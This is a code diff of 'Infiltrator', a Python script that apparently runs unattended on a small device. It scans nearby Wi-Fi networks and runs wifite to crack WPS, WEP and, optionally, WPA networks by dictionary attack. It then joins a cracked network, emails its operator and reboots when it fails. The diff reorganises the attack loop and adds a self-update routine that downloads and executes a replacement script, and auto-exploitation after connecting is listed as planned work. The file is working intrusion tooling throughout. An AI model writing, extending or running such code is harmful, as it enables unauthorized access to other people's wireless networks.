@@ -8,17 +8,16 @@ import time
 import sys
 import os
 import argparse
+import time
 
 #TODO: 
 #Make faulty AP detection (Blacklist ones that fail consistently)
 #Auto-select wifi interface (Strongest or random)
 #Make more reliable in general
-#Auto exploit once connected
-#BSSID instead of ESSID
-#Try later if none found nearby
+#Auto exploit option once connected
+#BSSID instead of ESSID for reliability
 
-# Default Settings, overwritten by args:
-interface = 'wlan0'
+# Default Settings, some overwritten by args:
 test_server = 'www.google.com'
 username = ''
 pwd = ''
@@ -32,13 +31,14 @@ dictionary = ''
 parser = argparse.ArgumentParser()
 parser.add_argument("-bg", "--background", help="Run in the background", action="store_true")
 parser.add_argument("-ac", "--autocrack", help="Run various automatic cracking programs once connected - W.I.P.", action="store_true")
-parser.add_argument("-i", "--interface", help="Choose wireless interface to use")
-parser.add_argument("-test", "--testmode", help="Will assume no internet connection when starting", action="store_true")
+parser.add_argument("-i", "--interface", help="Wireless interface to use.", default="wlan0")
+parser.add_argument("-test", "--testmode", help="Will run tests regardless of need for connection.", action="store_true")
 parser.add_argument("-addy", "--address", help="Choose email address to receive notification email")
 parser.add_argument("-usr", "--username", help="Choose email address to send notification email, i.e.: user@gmail.com")
 parser.add_argument("-pwd", "--password", help="Choose password for email to send notification email")
 parser.add_argument("-wpa", "--wpaattack", help="Enable the slower WPA cracking as last resort", action="store_true")
 parser.add_argument("-dict", "--dictionary", help="Dictionary to use for WPA cracking")
+parser.add_argument("--update", help="Update program from stable branch of GitHub after successful crack", action="store_true")
 args = parser.parse_args()
 
 subprocess.call(["sudo", "clear"])
@@ -60,6 +60,7 @@ if args.wpaattack:
     wpa_attack = True
 if args.dictionary:
     dictionary = args.dictionary
+
 
 print "Infiltrator by Evanito\n\nStarted, checking for internet..."
 
@@ -92,6 +93,7 @@ def wep_connect(iface, ap, passwd):
     print "Done."
 
 def wpa_connect(iface, ap, passwd):
+    subprocess.call(["sudo", "service", "network-manager", "stop"])
     man_mode(iface)
     subprocess.call(["sudo", "rm", "%s/wpa_connect.conf" %(path)]) 
     f01 = open("%s/wpa_connect.conf" %(path), "w")
@@ -101,6 +103,7 @@ def wpa_connect(iface, ap, passwd):
     print "Done connecting. Getting DHCP..."
     #subprocess.call(["sudo", "dhclient", "-r"])
     subprocess.call(["sudo", "dhclient", iface])
+    subprocess.call(["sudo", "service", "network-manager", "start"])
     print "Done."  
 
 def encrypt_type(ap):
@@ -157,6 +160,20 @@ def crosscheck():
     else:
         return [False]
 
+def updatestable():
+    print "UPDATING FROM STABLE BRANCH"
+    omitupdatearg = sys.argv
+    omitupdatearg.remove("--update") #No infinite update loops
+    with open("%s/updatestable.sh" %(path), mode='w') as updatefile:
+        updatefile.write("rm infiltrate.py\n")
+        updatefile.write("wget https://raw.githubusercontent.com/Evanito/Pifiltrator/master/infiltrate.py\n")
+        updatefile.write("rm index.*\n")
+        updatefile.close()
+        subprocess.call(["chmod", "+x", "updatestable.sh"])
+        subprocess.call(["sh", "updatestable.sh"])
+        print "Restarting script to apply update."
+        os.execl(sys.executable, *([sys.executable]+omitupdatearg))
+
 ap_list = []
 def PacketHandler(pkt):
     if pkt.haslayer(Dot11):
@@ -166,38 +183,24 @@ def PacketHandler(pkt):
                 print "Found AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
 
 
-# Start -
-if is_connected() == True and test_mode == False:
-    raise SystemExit
+# By the end of this "if" function, the goal is to be connected to the internet.
+if is_connected() == False or test_mode == True:
+    mon_mode(interface)
+    print "Looking for nearby networks..."
+    sniff(iface=interface, prn = PacketHandler, timeout=10)
+    while ap_list == []:
+        time.sleep(30)
+        sniff(iface=interface, prn = PacketHandler, timeout=10)
+    man_mode(interface)
 
-mon_mode(interface)
-print "Looking for nearby networks..."
-sniff(iface=interface, prn = PacketHandler, timeout=10)
-man_mode(interface)
-
-print "\n This is what we know:\n%s" %(populate_known()) 
-
-print "\n And here's what's nearby:\n%s" %(ap_list)
-crosschecked = crosscheck()
-if crosschecked[0] == False:
-    print "Wifite time."
-    gotem = False
-    for ap in ap_list: 
-        subprocess.call(["sudo", "wifite", '-wps', '-wep', '-pow', '25', "-i", interface, '-quiet', '-e', ap])
-        if ap in populate_known():
-            print "Cracked one."
-            crosschecked = crosscheck()
-            gotem = True
-            connect_wifi(interface, crosschecked[1], crosschecked[2])
-            if is_connected() == True:
-                print "Connected."
-                break
-            else:
-                subprocess.call(['sudo', 'reboot'])
-                raise SystemExit
-    if gotem == False and wpa_attack == True:
-        subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
-        for ap in ap_list:
+    print "\n This is what we know:\n%s" %(populate_known()) 
+    print "\n And here's what's nearby:\n%s" %(ap_list)
+    crosschecked = crosscheck()
+    if crosschecked[0] == False:
+        print "Wifite time."
+        gotem = False
+        for ap in ap_list: 
+            subprocess.call(["sudo", "wifite", '-wps', '-wep', '-pow', '25', "-i", interface, '-quiet', '-e', ap])
             if ap in populate_known():
                 print "Cracked one."
                 crosschecked = crosscheck()
@@ -206,21 +209,39 @@ if crosschecked[0] == False:
                 if is_connected() == True:
                     print "Connected."
                     break
-            else:
-                subprocess.call(['sudo', 'reboot'])
-                raise SystemExit
+                else:
+                    subprocess.call(['sudo', 'reboot'])
+                    raise SystemExit
+        if gotem == False and wpa_attack == True:
+            subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
+            for ap in ap_list:
+                if ap in populate_known():
+                    print "Cracked one."
+                    crosschecked = crosscheck()
+                    gotem = True
+                    connect_wifi(interface, crosschecked[1], crosschecked[2])
+                    if is_connected() == True:
+                        print "Connected."
+                        break
+                else:
+                    subprocess.call(['sudo', 'reboot'])
+                    raise SystemExit
+        else:
+            print "None found..."
+        print 'Wifite phase finished.'
     else:
-        print "None found..."
-    print 'Wifite phase finished.'
-else:
-    print "\nWe got one!\n%s ; %s" %(crosschecked[1], crosschecked[2])
-    connect_wifi(interface, crosschecked[1], crosschecked[2])
+        print "\nWe have one!\n%s ; %s" %(crosschecked[1], crosschecked[2])
+        connect_wifi(interface, crosschecked[1], crosschecked[2])
+
+    if is_connected() == True:
+        send_email()
+    else:
+        subprocess.call(['sudo', 'reboot'])
+        raise SystemExit
 
 if is_connected() == True:
-    send_email()
-else:
-    subprocess.call(['sudo', 'reboot'])
-    raise SystemExit
+    if args.update:
+        updatestable()
+    if args.autocrack:
+        print "Autocrack is a Work in progress"
 
-if args.autocrack:
-    print "Autocrack Work in progress"
